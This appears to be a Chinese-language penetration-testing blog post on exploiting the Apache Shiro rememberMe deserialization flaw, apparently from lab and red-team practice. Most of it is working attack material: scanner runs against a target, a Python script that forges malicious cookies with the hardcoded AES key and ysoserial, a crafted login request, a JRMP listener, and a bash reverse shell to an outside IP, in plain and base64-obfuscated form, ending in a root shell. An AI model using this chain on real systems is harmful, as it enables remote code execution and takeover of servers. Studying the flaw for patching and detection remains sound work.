---
title:      "「Shiro」:Apache-shiro框架利用整理"
author:     "Bin4xin"
catalog: true
article_header:
  type: cover
tags:
    - 笔记
    - vulnhub
    - 漏洞复现
    - CVE

---

> 漏洞特征：shiro反序列化的特征：1、在返回包的Set-Cookie的值为「rememberMe=deleteMe」2、Apache Shiro版本<= 1.2.4
现在很多j2ee开发都会采用shiro框架来做一些权限控制，框架的优势是出来了，当然就存在劣势。shiro是我在参加工作后才会慢慢去接触到，从一开始的代审，再到黑盒渗透，再到前一段时间刚结束的HW行动。
第一小结，是我自己在实践中的一些理解和经历，希望能够记录下来；第二小结是在学习中在网上的一些学习过程，当时也记录下来了，故此分为两个小结。


# 验证
在上面的简述中，可以来进行shiro框架的判断，同时，我们可以进一步对shiro框架是否存在反序列化来进行验证：
用到的是<a href="http://www.svenbeast.com/post/tskRKJIPg/">Shiroscan</a>脚本，开源在github上，用法就不多赘述。
```bash
python3 shiro_rce.py https://shiro.vuln.ip/login.html "ping x.dnslog.cn"
 ____  _     _          ____                  
/ ___|| |__ (_)_ __ ___/ ___|  ___ __ _ _ __  
\___ \| '_ \| | '__/ _ \___ \ / __/ _` | '_ \ 
 ___) | | | | | | | (_) |__) | (_| (_| | | | |
|____/|_| |_|_|_|  \___/____/ \___\__,_|_| |_|

                           By 斯文

Welcome To Shiro反序列化 RCE ! 
[*]  开始检测模块 Class1:CommonsBeanutils1
```
然后脚本开始对不同的秘钥进行生成cookie，尝试让机器执行命令。等待脚本在跑的时候或者跑完，看一下dnslog上的dns记录，如果存在记录如下所示，那么就说明存在反序列化漏洞使得机器执行了任意代码，反之则无：
```javascript
x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:46:35
x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:45:52
x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:45:52
x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:45:52
```
## 不服气
当然有的时候用shiroScan扫结束后并没有记录，即不存在漏洞；但是像我，又不死心，于是又在网上折腾找了另外一个能够跑秘钥的探测脚本-_-
<a href="https://www.bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/">作者博客</a>
```javascript
python shiro_exp.py https://shiro.vuln.ip/login.html
try CipherKey :4AvVhmFLUs0KTA3Kprsdag==
generator payload done.
send payload ok.
checking.....
checking.....
checking.....
checking.....
vulnerable:true url:https://shiro.vuln.ip/login.html    CipherKey:3AvVhmFLUs0KTA3Kprsdag==
```
当然秘钥对于我们理解shiro反序列化框架也有一定的帮助，shiro的反序列化最初的漏洞来源也是因为秘钥硬编码。

## getshell
通过上面的步骤我们就可以对shiro反序列化做一个判定，肯定是存在RCE漏洞，那么来实现我们的最终目的，GET-shell
一般反弹shell的执行代码`bash -i >& /dev/tcp/47.52.233.92/11111 0>&1`，首先需要把代码进行base64编码，只有经过base64编码后shiro才认得这个命令，通过shiro自己本身的base64解码最终达到执行命令的目的；
转成base64编码->`bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny41Mi4yMzMuOTIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}`；像我比较偷懒，就直接在脚本上添加反弹shell，这样的好处就是我们不需要在生成poc的脚本里替换cookie，由脚本自动生成的cookie自动去跑，省事很多
来源：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">我是转换网址:-)</a>
监听端口等待shell回连（我这里的样例是docker环境）
```javascript
nc -lvvp 11111
Listening on [0.0.0.0] (family 0, port 11111)
Connection from 59.110.152.168 47274 received!
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@6d5a7848dbef:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

# 学习
## 工具
使用ysoserial进行流量监听，下面是ysoserial的jar包生成，懂得开发同学都懂。
```javascript
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial
mvn package -D skipTests
```
## how-to-poc
使用poc代码获得对应的rememberMe的cookie值。
```javascript
# -*- coding:utf-8 -*-
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES

def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    payload = encode_rememberme(sys.argv[1])    
print "rememberMe={0}".format(payload.decode())
```
```javascript
D:\bin4xin\code\shiro\shrio-poc\ysoserial\target> python .\shrio-poc.py 47.52.233.92:6666
rememberMe=W8BOhPe8Qdy8FJ5N9genqt4WjZaONr1NQ+dXgDCV1RrGHUwMfd8ljlA9AG64t7vzUesOp7YKsz6EFFHgyrq1qRqUiPFBnEBi/NNNpE2UR8CgMsf1KY2rbBurFv1Gwslv2+SL7hy3YNq9cpPWm5S8o+nJpa6IyI9cZ+n7a+6hjB4Yfnf89u3BLi4AxOXL35SotH2AdSX2iZrWgGAcah9oW21JwpC2zj4YMjsGf2tPYUysP873bYYHuSIohaXf3bcq4YuQajMctVmM3IvjeY5Ggva9QRUvo5B1o0sPNHdXGwn/z9t/KWcSeTWE+Dt2f95a9QjEIoic6s88Tv0SKjY6UdCmTxN3vVE8rs1haiA48R1CuUQQiWa9V28m2qkonX9aUEUl4kTGGvF+Y5eB4MaNTw==
```

抓包，前台登录拦包，勾选`Remember Me`，截获数据包，替换cookie构造数据包：

```javascript
POST /doLogin HTTP/1.1
underattack-host: underattack-host:8080
Content-Length: 55
Cache-Control: max-age=0
Origin: http://underattack-host:8080
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://underattack-host:8080/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: rememberMe=RFUadguvSoq4kMm3ZwnkO/MHiokCrqrCURXUqUWaXLBM7/fBF65qvjWDFZeh49zHDRm5oKPU1AhmbEBaYRp3ASrQpHdp7mYrChOi51tmq9qkzWemDnjbUXtp8B6RF1EUNV2q2tKaKlf4AAR1hZIRJGbz4CpLeumNAeWB98f6/T0GaWJGGve9rP6l9/7iU5Y9Xj4ZmSBP6LgMHYF3TJ2DDdTNI4nPITeQI3S+9ol/BmT14Be5m0ENfOkm1cdm3L8Rj/pbeE842Y3nUioEdAXizCrOsCYT+u2QTWHt1YZLmB/xsfQvEV5bRpRJeRv/ps7V00PiXvCeaPQoDs541wqB75+/RRAdqU8TWnJE7YhvQVkxTRLvCjBTtwfkgA3XVA8X+518nh0wSoj8/Ajaoi5MbA==
Connection: close

username=asdmnin&password=asdasd&rememberme=remember-me
```
使用包监听6666端口：
```javascript
root@iZj6cgn7odv59wmjjhe6zwZ:/home/tool/shiro_poc/POC-2/ysoserial/target# java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny41Mi4yMzMuOTIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}'
* Opening JRMP listener on 6666
```
发包，我们看到jrmp监听的端口已经有流量回流回来了，如下：
```javascript
Have connection from /underattack-host:58272
Reading message...
Is DGC call for [[0:0:0, 356978429], [0:0:0, 2006635131]]
Sending return with payload for obj [0:0:0, 2]
Closing connection
Have connection from /underattack-host:58274
Reading message...
Is DGC call for [[0:0:0, 356978429], [0:0:0, -1104978848], [0:0:0, 2006635131]]
Sending return with payload for obj [0:0:0, 2]
Closing connection
```

以上。





